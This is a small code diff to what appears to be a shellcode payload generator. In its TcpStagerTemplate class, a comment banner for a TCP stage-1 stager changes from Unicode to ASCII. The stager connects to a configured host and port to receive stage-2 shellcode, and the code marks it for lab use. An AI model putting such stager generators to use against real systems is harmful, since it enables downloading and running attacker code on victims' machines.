@@ -61,7 +61,7 @@ class TcpStagerTemplate(PayloadTemplate):
         sockaddr_off = -layout.slot("sockaddr_in").offset
 
         return "\n".join([
-            "; ── TCP Stager (stage 1) ────────────────────────────────────────────",
+            "; -- TCP Stager (stage 1) --",
             f"; Server: {config.lhost}:{config.lport}",
             "; Protocol: [uint32 LE size][raw stage-2 shellcode]",
             "; Framing: minimal (single recv for size header; lab use only)",
